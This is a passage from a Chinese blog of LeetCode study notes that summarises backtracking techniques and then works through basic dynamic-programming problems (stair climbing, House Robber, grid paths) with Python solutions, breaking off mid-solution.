总结</h3><ul><li><p><strong>回溯是递归的副产品，只要有递归就会有回溯</strong>，所以回溯法也经常和二叉树遍历，其实抽象结构两者是相同的</p></li><li><p><strong>用递归控制for循环嵌套的数量</strong></p></li><li><p>搜索的过程：<strong>for循环横向遍历，递归纵向遍历，回溯不断调整结果集</strong></p></li><li><p><strong>剪枝精髓是：for循环在寻找起点的时候要有一个范围，如果这个起点到集合终止之间的元素已经不够题目要求的k个元素了，就没有必要搜索了</strong>。</p></li><li><p>集合元素会有重复，但要求解集不能包含重复的组合：**“树枝去重”和“树层去重”**组合问题可以抽象为树形结构，那么“使用过”在这个树形结构上是有两个维度的，一个维度是同一树枝上“使用过”，一个维度是同一树层上“使用过”。</p></li><li><p><strong>也可以使用set针对同一父节点本层去重，但子集问题一定要排序</strong></p></li><li><p><strong>使用used数组在时间复杂度上几乎没有额外负担！</strong></p></li><li><p>深度优先搜索也是用递归来实现的，所以往往伴随着回溯。</p></li><li><p><strong>单纯的回溯搜索（深搜）并不难，难还难在容器的选择和使用上</strong></p></li><li><p><strong>棋盘的宽度就是for循环的长度，递归的深度就是棋盘的高度，这样就可以套进回溯法的模板里了</strong>。</p></li><li><p>子集问题分析：</p><ul><li>时间复杂度：O(2<sup>n)，因为每一个元素的状态无外乎取与不取，所以时间复杂度为O(2</sup>n)</li><li>空间复杂度：O(n)，递归深度为n，所以系统栈所用空间为O(n)，每一层递归所用的空间都是常数级别，注意代码里的result和path都是全局变量，就算是放在参数里，传的也是引用，并不会新申请内存空间，最终空间复杂度为O(n)</li></ul><p>排列问题分析：</p><ul><li>时间复杂度：O(n!)，这个可以从排列的树形图中很明显发现，每一层节点为n，第二层每一个分支都延伸了n-1个分支，再往下又是n-2个分支，所以一直到叶子节点一共就是 n * n-1 * n-2 * … 1 = n!。</li><li>空间复杂度：O(n)，和子集问题同理。</li></ul><p>组合问题分析：</p><ul><li>时间复杂度：O(2^n)，组合问题其实就是一种子集的问题，所以组合问题最坏的情况，也不会超过子集问题的时间复杂度。</li><li>空间复杂度：O(n)，和子集问题同理。</li></ul><p>N皇后问题分析：</p><ul><li>时间复杂度：O(n!) ，其实如果看树形图的话，直觉上是O(n^n)，但皇后之间不能见面所以在搜索的过程中是有剪枝的，最差也就是O（n!），n!表示n * (n-1) * … * 1。</li><li>空间复杂度：O(n)，和子集问题同理。</li></ul><p>解数独问题分析：</p><ul><li>时间复杂度：O(9^m) , m是’.'的数目。</li><li>空间复杂度：O(n<sup>2)，递归的深度是n</sup>2</li></ul></li><li><p>117217</p></li></ul><h1 id="动态规划基础版"><a class="markdownIt-Anchor" href="#动态规划基础版"></a> 动态规划(基础版)</h1><h2 id="斐波那契型"><a class="markdownIt-Anchor" href="#斐波那契型"></a> 斐波那契型</h2><h3 id="746-使用最小花费爬楼梯"><a class="markdownIt-Anchor" href="#746-使用最小花费爬楼梯"></a> <a href="https://leetcode.cn/problems/min-cost-climbing-stairs/">746. 使用最小花费爬楼梯</a></h3><p>给你一个整数数组 <code>cost</code> ，其中 <code>cost[i]</code> 是从楼梯第 <code>i</code> 个台阶向上爬需要支付的费用。一旦你支付此费用，即可选择向上爬一个或者两个台阶。</p><p>你可以选择从下标为 <code>0</code> 或下标为 <code>1</code> 的台阶开始爬楼梯。</p><p>请你计算并返回达到楼梯顶部的最低花费。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">minCostClimbingStairs</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> cost<span class="token punctuation">:</span> List<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">int</span><span class="token punctuation">:</span>        n<span class="token operator">=</span><span class="token builtin">len</span><span class="token punctuation">(</span>cost<span class="token punctuation">)</span>        dp<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token builtin">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span>cost<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">+</span>cost<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> dp<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最基础的动态规划了吧，，，</p><p>写出最简单的状态转移方程就行了</p><h3 id="198-打家劫舍"><a class="markdownIt-Anchor" href="#198-打家劫舍"></a> <a href="https://leetcode.cn/problems/house-robber/">198. 打家劫舍</a></h3><p>你是一个专业的小偷，计划偷窃沿街的房屋。每间房内都藏有一定的现金，影响你偷窃的唯一制约因素就是相邻的房屋装有相互连通的防盗系统，<strong>如果两间相邻的房屋在同一晚上被小偷闯入，系统会自动报警</strong>。</p><p>给定一个代表每个房屋存放金额的非负整数数组，计算你 <strong>不触动警报装置的情况下</strong> ，一夜之内能够偷窃到的最高金额。</p><p><a href="https://leetcode.cn/problems/house-robber/solutions/138131/dong-tai-gui-hua-jie-ti-si-bu-zou-xiang-jie-cjavap/?envType=study-plan-v2&amp;envId=dynamic-programming">198. 打家劫舍 - 力扣-详细解析（LeetCode）</a></p><h4 id="思路-16"><a class="markdownIt-Anchor" href="#思路-16"></a> 思路</h4><p>偷k间房子的最大价值:可分解为2种偷法</p><ul><li>偷第k间+前k-2间房子最大价值</li><li>不偷第k间+前k-1间房子的最大价值</li></ul><p>根据此就可列出状态转移方程</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">rob</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> nums<span class="token punctuation">:</span> List<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">int</span><span class="token punctuation">:</span>        n<span class="token operator">=</span><span class="token builtin">len</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span>        dp<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span>        dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span>        dp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>nums<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>            dp<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token builtin">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span>dp<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> dp<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于每次计算都只用了两个值</p><p>还可进一步优化空间复杂度为O(1)</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">rob</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> nums<span class="token punctuation">:</span> List<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">int</span><span class="token punctuation">:</span>        n<span class="token operator">=</span><span class="token builtin">len</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span>        prev<span class="token operator">=</span><span class="token number">0</span>        current<span class="token operator">=</span>nums<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>            prev<span class="token punctuation">,</span>current<span class="token operator">=</span>current<span class="token punctuation">,</span><span class="token builtin">max</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span>prev<span class="token punctuation">,</span>current<span class="token punctuation">)</span>        <span class="token keyword">return</span> current<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="740-删除并获得点数"><a class="markdownIt-Anchor" href="#740-删除并获得点数"></a> <a href="https://leetcode.cn/problems/delete-and-earn/">740. 删除并获得点数</a></h3><p>给你一个整数数组 <code>nums</code> ，你可以对它进行一些操作。</p><p>每次操作中，选择任意一个 <code>nums[i]</code> ，删除它并获得 <code>nums[i]</code> 的点数。之后，你必须删除 <strong>所有</strong> 等于 <code>nums[i] - 1</code> 和 <code>nums[i] + 1</code> 的元素。</p><p>开始你拥有 <code>0</code> 个点数。返回你能通过这些操作获得的最大点数。</p><h4 id="思路-17"><a class="markdownIt-Anchor" href="#思路-17"></a> 思路</h4><p>才看题目的时候是挺懵b的，根本不知道怎么写状态方程</p><p>但实际上我们从1开始计算</p><p>会发现其实和打家劫舍是有共通点的：</p><h5 id="相同点"><a class="markdownIt-Anchor" href="#相同点"></a> 相同点</h5><ol><li>打家劫舍中是<strong>相邻的房子不能连续偷</strong>。</li><li>这个题是<strong>相邻的数字不能同时拿</strong>（拿一个相邻的就删除了。）</li></ol><h5 id="不同点"><a class="markdownIt-Anchor" href="#不同点"></a> 不同点</h5><ol><li>前者打家劫舍是有房子的金额，如果我们能够算出这个题目中的“金额”我们就能够迎刃而解。</li></ol><p>怎么算金额呢？实际上金额就是 数字i出现的次数*i</p><p>那么就可以类比写出状态方程:</p><p>f[i]=max(f[i-2]+cnt[i]*i,f[i-1])</p><p>那么这题就很清晰了</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">deleteAndEarn</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> nums<span class="token punctuation">:</span> List<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">int</span><span class="token punctuation">:</span>        cnt<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">10010</span>        m<span class="token operator">=</span><span class="token builtin">max</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span>        <span class="token comment">#统计数字出现的次数</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> nums<span class="token punctuation">:</span>            cnt<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+=</span><span class="token number">1</span>        dp<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">10002</span>        <span class="token comment">#特殊情况的处理</span>        dp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>cnt<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">1</span>        dp<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token builtin">max</span><span class="token punctuation">(</span>cnt<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>m<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token builtin">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">+</span>cnt<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">*</span>i<span class="token punctuation">)</span>        <span class="token keyword">return</span> dp<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="矩阵"><a class="markdownIt-Anchor" href="#矩阵"></a> 矩阵</h2><h3 id="62-不同路径"><a class="markdownIt-Anchor" href="#62-不同路径"></a> <a href="https://leetcode.cn/problems/unique-paths/">62. 不同路径</a></h3><p>一个机器人位于一个 <code>m x n</code> 网格的左上角 （起始点在下图中标记为 “Start” ）。</p><p>机器人每次只能向下或者向右移动一步。机器人试图达到网格的右下角（在下图中标记为 “Finish” ）。</p><p>问总共有多少条不同的路径？</p><h4 id="思路-18"><a class="markdownIt-Anchor" href="#思路-18"></a> 思路</h4><p>梦回高中了，属于是</p><p>利用排列组合的知识，可以得到路径的递推关系:</p><pre class="line-numbers language-none"><code class="language-none">dp[i][j]&#x3D;dp[i-1][j]+dp[j-1][i]#dp代表（i，j）的路径数<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>于是</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">uniquePaths</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> m<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span> n<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">int</span><span class="token punctuation">:</span>        <span class="token comment">#生成一个二维数组,最上边的一行路径都是1</span>        <span class="token comment">#在dp里面直接把特殊情况给处理了</span>        dp<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">*</span>n<span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token punctuation">(</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>m<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>m<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span>dp<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">+</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token keyword">return</span> dp<span class="token punctuation">[</span>m<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>进一步优化空间复杂度，把空间复杂度降到O（n）</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">uniquePaths</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> m<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span> n<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">int</span><span class="token punctuation">:</span>        cur <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">*</span> n        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> m<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>                cur<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">+=</span> cur<span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token keyword">return</span> cur<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="64-最小路径和"><a class="markdownIt-Anchor" href="#64-最小路径和"></a> <a href="https://leetcode.cn/problems/minimum-path-sum/">64. 最小路径和</a></h3><p>给定一个包含非负整数的 <code>*m* x *n*</code> 网格 <code>grid</code> ，请找出一条从左上角到右下角的路径，使得路径上的数字总和为最小。</p><p>**说明：**每次只能向下或者向右移动一步。</p><h4 id="思路-19"><a class="markdownIt-Anchor" href="#思路-19"></a> 思路</h4><p>是上一题的加强版，稍加修改就行了</p><pre class="line-numbers language-none"><code class="language-none">dp[i][j]&#x3D;min(dp[i-1][j],dp[i][j-1])+values[i][j]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>于是</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">minPathSum</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> grid<span class="token punctuation">:</span> List<span class="token punctuation">[</span>List<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">int</span><span class="token punctuation">:</span>        <span class="token comment">#m=Rows</span>        m<span class="token operator">=</span><span class="token builtin">len</span><span class="token punctuation">(</span>grid<span class="token punctuation">)</span>        <span class="token comment">#n=cols</span>        n<span class="token operator">=</span><span class="token builtin">len</span><span class="token punctuation">(</span>grid<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            dp<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token comment">#先计算边上的:</span>        dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>grid<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>            dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span>grid<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">+</span>dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>m<span class="token punctuation">)</span><span class="token punctuation">:</span>            dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>grid<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span>dp<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>m<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span><span class="token builtin">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>grid<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span>        <span class="token keyword">return</span> dp<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="63-不同路径-ii"><a class="markdownIt-Anchor" href="#63-不同路径-ii"></a> <a href="https://leetcode.cn/problems/unique-paths-ii/">63. 不同路径 II</a></h3><p>一个机器人位于一个 <code>m x n</code> 网格的左上角 （起始点在下图中标记为 “Start” ）。</p><p>机器人每次只能向下或者向右移动一步。机器人试图达到网格的右下角（在下图中标记为 “Finish”）。</p><p>现在考虑网格中有障碍物。那么从左上角到右下角将会有多少条不同的路径？</p><p>网格中的障碍物和空位置分别用 <code>1</code> 和 <code>0</code> 来表示。</p><h4 id="思路-20"><a class="markdownIt-Anchor" href="#思路-20"></a> 思路</h4><p>是62的plus版</p><p>障碍处理：<br />有障碍 = 此路不通 = 此格没有路线 = 此格路线数为0<br />由于初始化每一格路线数 = 0，<br />所以遇到障碍格，不更新该格即可。</p><p>我考虑直接在障碍图上进行处理</p><p>当然也可以单独开个二维表存储路线，不过有点浪费空间</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">uniquePathsWithObstacles</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> obstacleGrid<span class="token punctuation">:</span> List<span class="token punctuation">[</span>List<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">int</span><span class="token punctuation">:</span>        <span class="token comment">#生成一个二维数组,最上边的一行路径都是1</span>        <span class="token comment">#在dp里面直接把特殊情况给处理了</span>        m<span class="token operator">=</span><span class="token builtin">len</span><span class="token punctuation">(</span>obstacleGrid<span class="token punctuation">)</span>        n<span class="token operator">=</span><span class="token builtin">len</span><span class="token punctuation">(</span>obstacleGrid<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> obstacleGrid<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token number">0</span>        <span class="token comment">#在障碍图的基础上填充路线</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>i<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token punctuation">(</span>j<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    obstacleGrid<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span>                <span class="token comment">#在这里要多一些对于特殊情况的处理</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    <span class="token comment">#利用dp累加路线,在这里优先级很重要</span>                    <span class="token comment">#要先判断该位置是否有障碍物然后进行处理</span>                    <span class="token comment">#if elif如果条件都满足只执行if</span>                    <span class="token keyword">if</span> obstacleGrid<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span>                        obstacleGrid<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span>                    <span class="token keyword">elif</span> i<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>                        obstacleGrid<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span>obstacleGrid<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>                    <span class="token keyword">elif</span> j<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>                        obstacleGrid<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span>obstacleGrid<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span>                    <span class="token keyword">else</span><span class="token punctuation">:</span>                        obstacleGrid<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span>obstacleGrid<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">+</span>obstacleGrid<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token keyword">return</span> 